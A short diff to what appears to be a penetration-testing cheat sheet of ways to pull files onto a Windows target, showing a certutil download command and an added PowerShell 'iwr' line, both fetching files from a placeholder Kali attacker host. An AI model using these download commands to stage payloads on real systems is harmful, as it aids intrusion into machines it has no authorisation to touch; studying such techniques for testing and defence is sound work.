@@ -29,4 +29,4 @@ Option 5) The best option to run
         certutil -urlcache -split -f http://<Kali IP address:Port>/<File> <Output file path e.g. c:\temp\test.zip>
 
 
-Option 6) 
+Option 6) iwr -uri http://<Kali IP address>:<Port>/<file name>
